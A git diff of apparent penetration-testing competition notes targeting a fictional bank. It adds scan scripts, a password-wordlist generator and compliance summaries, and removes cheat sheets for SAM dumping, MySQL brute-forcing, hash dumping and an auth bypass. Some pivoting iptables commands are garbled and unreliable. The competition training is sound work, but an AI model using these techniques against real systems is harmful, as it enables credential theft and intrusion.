@@ -2,101 +2,148 @@
 
 ## Google Drive Structure
 
-`Deconfliction`
+Folder for each team member with `logs` folder that logs should be copied to at end and running `notes` document.
 
-| Name  | IP Address | Type of Attack | Completed | Description |
-| ----- | ---------- | -------------- | --------- | ----------- |
-| Sears | 8.8.8.8    | Cyber Nuke     | Yes/No    | Example     |
-| ...   | ...        | ...            | ...       | ...         |
-
-`Persistence`
-
-| Name  | Victim IP:Port | Callback IP:Port | Type         | Notes   | Location      |
-| ----- | -------------- | ---------------- | ------------ | ------- | ------------- |
-| Sears | 8.8.8.8:420    | 192.168.1.1:6969 | Reverse/Bind | Example | /tmp/hack.exe |
-| ...   | ...            | ...              | ...          | ...     | ...           |
-
-`[name] Notetaker`
-
-```
-IP:
-User:
-Type of Exploit: Initial / Privilege Escalation / Pivot / Information Disclosure etc.
-Complete: Yes / No
-Stuff to change back:
-Walkthrough: include commands, screenshots, other notes, etc.
-```
+Folder `scans` with document for each pasted nmap scan.
 
 ## VDI Setup
 
 ### Windows VDI
 
-1. Go to https://github.com/fireeye/commando-vm
-2. Download and extract ZIP in Downloads
-3. Download `profile.json` and `profile_full.json` from https://github.com/nationalcptc-teamtools/United-States-Air-Force-Academy to the same folder
-4. Run this in PowerShell as admin:
+Recommended software to install:
 
-```powershell
-Set -ExecutionPolicy Unrestricted
-A
-cd ${Env:UserProfile}\Downloads\commando-vm-master\commando-vm-master\
-.\install.ps1 -profile_file .\profile.json -password <windows_password>
-R
-Y
-N
-.\install.ps1 -profile_file .\profile_full.json # for more tools
-```
+- Bitvise SSH client - https://bitvise.com/ssh-client-download
+- Wireshark -  https://www.wireshark.org/download.html 
 
 ### Linux VDI
 
-[Optional] In a terminal:
+Use Bitvise from Windows VDI to SSH to Linux VDI. On first login, in home folder, do this:
 
 ```sh
-sudo su - # makes you root
-apt-get install git
-git clone https://github.com/1N3/Sn1per.git
-cd Sn1per
-bash install_debian_ubuntu.sh # there will be a couple prompts after
+mkdir logs
+echo "script ~/logs/\$(date +%s).log" >> .bash_profile
 ```
 
-Whenever starting a new terminal, choose a new file name to log your terminal to:
+## Scripts
+
+### Scanning Check
+
+Add as `~/scan_check.sh`:
 
 ```sh
-script <filename>
-exit # to save changes to file (might save anyways)
+nmap <ip_range> -T4 -F -oN ~/new_scan
+DIFF=$(diff ~/last_scan ~/new_scan)
+if [ "$DIFF" != "" ]
+then
+	echo "$DIFF" > "diff-$(date +%s).txt"
+	echo "Scan change at $(date +%s)" | wall
+fi
+rm ~/last_scan
+mv ~/new_scan ~/last_scan
 ```
+
+Add with `sudo crontab -e`:
+
+```sh
+*/15 * * * * sh /home/???/scan_check.sh
+```
+
+### Password List
+
+Add as `old.txt`:
+
+```
+august2019
+august19
+september2019
+september19
+october2019
+october19
+november2019
+november19
+spring2019
+spring19
+winter2019
+winter19
+fall2019
+fall19
+bank
+dino
+dinobank
+dinoBank
+gotham
+metropolis
+springfield
+```
+
+Add as `combine.py`:
+
+```python
+def leet(strings, old, new):
+    for x in strings:
+        if old in x:
+            strings.append(x.replace(old, new))
+
+# Read the old passwords
+with open("old.txt", "r") as f:
+    old_list = f.read().split("\n")
+
+# Add capitals
+for x in old_list:
+    old_list.append(x.capitalize())
+    
+# Add leetspeak
+leet(old_list, "a", "@")
+leet(old_list, "i", "1")
+leet(old_list, "o", "0")
+leet(old_list, "s", "5")
+
+# Combine the strings
+new_list = []
+for x in old_list:
+    for y in old_list:
+        if x != y:
+            new_list.append(x + y + "\n")
+            
+# Add the single word passwords
+new_list.extend(old_list)
+
+# Add 1 to end
+for x in new_list:
+    if not x[-1].isdigit():
+        new_list.append(x + "1")
+        
+# Add ! to end
+for x in new_list:
+    new_list.append(x + "!")
+
+# Write the new passwords
+with open("new.txt", "w") as f:
+    for x in new_list:
+        f.write(x + "\n")
+```
+
+Put `new.txt` in the Google Drive.
 
 ## Reconnaissance
 
 Initial scan (paste in a Google Doc):
 
 ```sh
-nmap <ip_range> -T1 -F -oN scan_short
+nmap <ip_range> -T4 -F -oN scan_short
 ```
 
 Much longer scan (paste in a Google Doc):
 
 ```sh
-nmap <ip_range> -T1 -p- -A -oN scan_long
+nmap <ip_range> -T4 -p- -A -oN scan_long
 ```
 
-Dump traffic (use WinSCP on Windows to retrieve the PCAP and open it in Wireshark):
+Dump traffic (use Bitvise on Windows to retrieve the PCAP and open it in Wireshark):
 
 ```sh
 ifconfig # find name of interface
 tcpdump -i <interface> -s 65535 -w dump.pcap
-```
-
-[Optional] Quickly detect vulnerable services:
-
-```sh
-nmap -T1 -p- -sV -oX searchsploit.xml <ip_range>; searchsploit --nmap searchsploit.xml
-```
-
-[Optional] Enumerate subdomains:
-
-```sh
-spyse -target <domain> --subdomains
 ```
 
 ## Pivoting
@@ -122,113 +169,6 @@ echo "1" /proc/sjs/net/lpv4/lp forward
 iptables -t nat -A PREROUTING -p tcp -i ethO -j DNAT -d <pivot_ip> --dport 443 -to-destination <attack_ip> :443
 iptables -t nat -A POSTROUTING -p tcp -i ethC -j SNAT -s <target> <subnet> <cidr> -d <attack_ip> ---dport 443 -to-source <pivot_ip>
 iptables -t filter -I FORWARD 1 -j ACCEPT
-```
-
-## Windows SAM
-
-Second location is where to save to.
-
-```
-reg save hklm\sam c:\sam
-reg save hklm\system c:\system
-samdump2
-```
-
-## MySQL
-
-### Port Reference
-
-| Default Port/Protocol | Description                                          | SSL or other encryption |
-| --------------------- | ---------------------------------------------------- | ----------------------- |
-| 3306/tcp              | MySQL client to MySQL server                         | Yes                     |
-| 3306/tcp              | MySQL router to MySQL server                         | Yes (inherited)         |
-| 33060/tcp             | MySQL client to MySQL server (MySQL X protocol)      | Yes                     |
-| 33061/tcp             | MySQL Group Replication internal communications port | Yes                     |
-| 33062/tcp             | Specifically for MySQL administrative connections    | Yes                     |
-| 6446/tcp              | Any SQL from the MySQL client to MySQL Router        | Yes (inherited)         |
-
-### Nmap attacks
-
-Get info:
-
-```sh
-nmap --script=mysql-info <target>
-```
-
-Empty password for `root` or `anonymous`:
-
-```sh
-nmap -sV --script=mysql-empty-password <target>
-```
-
-Bruteforce attack:
-
-```sh
-nmap -p3306 --script=mysql-brute --script-args userdb=<user_list_file>,passdb=<pass_list_file> <target>
-```
-
-Retrieve all password hashes:
-
-```sh
-nmap -p3306 <target> --script=mysql-dump-hashes --script-args username=<username>,password=<password>
-```
-
-Get database names:
-
-```sh
-nmap -p3306 <target> --script=mysql-databases --script-args mysqluser=<username>,mysqlpass=<password>
-```
-
-### Authentication Bypass
-
-Works on:
-
-- Oracle MySQL `5.1.x before 5.1.63, 5.5.x before 5.5.24, and 5.6.x before 5.6.6`
-- MariaDB `5.1.x before 5.1.62, 5.2.x before 5.2.12, 5.3.x before 5.3.6, and 5.5.x before 5.5.23`
-
-```sh
-mysql --host=<target> -u root mysql --password=blah
-```
-
-### Metasploit Modules
-
-- `auxiliary/scanner/mysql/mysql_login` - bruteforce username/password
-- `auxiliary/scanner/mysql/mysql_hashdump` - dump hashes
-
-## FTP
-
-FTP is transmitted in plaintext, so you can sniff username and password.
-
-Common usernames are `ftp`, `anonymous`, and passwords could be an email address.
-
-### Metasploit Modules
-
-- `auxiliary/scanner/ftp/anonymous` - check for anonymous login
-- `auxiliary/scanner/ftp/ftp_version` - enumerates banner
-- `auxiliary/scanner/ftp/ftp_login` - bruteforce username/password
-
-## Redis
-
-Runs on port 6379. CLI:
-
-```sh
-redis-cli -h <host> -a <password>
-```
-
-Important files:
-
-- `installdir/redis/etc/redis.conf`
-- `installdir/redis/var/log/redis-server.log`
-- `/var/lib/redis`
-- `/etc/redis.conf`
-- `.rediscli_history`
-
-```
-/etc/redis.conf
-	requirepass PASSWORD
-and in slave:
-	masterpass  master_password
-	requirepass slave_password
 ```
 
 ## OSINT
@@ -346,7 +286,7 @@ Website - http://www.dinobank.us/ (Wordpress)
   Springfield, IL, 11001
   (789) 012-3456
 
-### Githubs
+### GitHubs
 
 https://github.com/DinoDanOliver/bluekeep-exploit
 https://github.com/dino-alex-faulkner/dino -- what EVERYONE uses as a chat app
@@ -356,7 +296,77 @@ https://etherscan.io/address/0xfd77ee88f5678553a575b7302c48e9aba9597d8c#code - s
 
 Private SSH key: https://bit.ly/2VvkiUB
 
+## Regulations
+
+As a leading financial institution, DinoBank has many regulations and frameworks it must maintain compliance with. These include: GLBA, PCI, FinCEN, KYC/AML, The US PATRIOT Act, FINRA, and others. 
+
+GDPR - GENERAL DATA PROTECTION REGULATION
+
+https://gdpr-info.eu/ (Official text)
+
+https://digitalguardian.com/blog/what-gdpr-general-data-protection-regulation-understanding-and-complying-gdpr-data-protection (Important articles)
+
+Any company that markets goods or services to EU residents, regardless of its location, is subject to the regulation
+
+“DinoBank is international, there are foreign employees as well as customers in the foreign locations” 
+
+Penalties: For companies that fail to comply with certain GDPR requirements, fines may be up to 2% or 4% of total global annual turnover or €10m or €20m, whichever is greater
+
+GLBA - GRAMM-LEACH-BLILEY ACT
+
+https://digitalguardian.com/blog/what-glba-compliance-understanding-data-protection-requirements-gramm-leach-bliley-act 
+
+The GLBA requires that financial institutions act to ensure the confidentiality and security of customers’ “nonpublic personal information,” or NPI. Nonpublic personal information includes Social Security numbers, credit and income histories, credit and bank card account numbers, phone numbers, addresses, names, and any other personal customer information received by a financial institution that is not public. 
+
+Financial institutions found in violation face fines of $100,000 for each violation.
+
+PCI - PAYMENT CARD INDUSTRY DATA SECURITY STANDARD
+
+https://www.tripwire.com/state-of-security/regulatory-compliance/beginners-guide-pci-compliance/
+
+https://www.varonis.com/blog/pci-compliance/
+
+If your organization processes, stores or transmits credit card data, you’re required to be PCI DSS compliant.
+
+Level 1: Any merchant processing 6 million+ transactions per year across all channels or any merchant that has had a data breach. Credit card companies can also upgrade any merchant to Level 1 at their discretion.
+
+Level 2: Any merchant processing between 1-6 million transactions per year across all channels.
+
+Level 3: Any merchant processing between 20,000 and 1 million e-commerce transactions per year.
+
+Level 4: Any merchant processing less than 20,000 e-commerce transactions per year or any merchant processing up to 1 million regular transactions per year.
+
+Fines vary from $5,000 to $100,000 per month until the merchants achieve compliance.
+
+Fines issued by the PCI are small in comparison to credit monitoring fees, laws suits, and actions by state and federal governments that can result when you’re not truly PCI DSS compliant.
+
+KYC (KNOW YOUR CUSTOMER)/ AML (ANTI-MONEY LAUNDERING)
+
+FinCEN - FINANCIAL CRIMES ENFORCEMENT NETWORK/PATRIOT ACT
+
+https://www.investopedia.com/terms/f/fincen.asp
+
+https://www.investopedia.com/terms/p/patriotact.asp
+
+Government bureau that maintains a network whose goal it is to prevent and punish criminals and criminal networks that participate in money laundering and other financial crimes.
+
+FinCEN is authorized to exercise regulatory duties per the Currency and Financial Transactions Reporting Act of 1970, as amended by Title III of the USA PATRIOT Act of 2001.
+
+PATRIOT ACT
+
+It [Patriot Act] also impacts the broader U.S. community of financial professionals and financial institutions engaging in cross-border transactions with its Title III provision, "International Money Laundering Abatement and Financial Anti-Terrorism Act of 2001.”
+
+Title III - the practical result of the Patriot Act’s Title III provision effectively translates to unprecedented levels of due diligence on any corresponding accounts that exist in money-laundering jurisdictions throughout the world
+
+## Other Teams
+
+CalPoly has interesting setup scripts for Linux in `linux_setup`
+
+RIT has service cheat sheets in `cheatsheet`
+
 ## External References
+
+https://bit.ly/347bFTt - Windows AD pentesting guide
 
 https://bit.ly/3117FS9 - various helpful red teaming resources
 
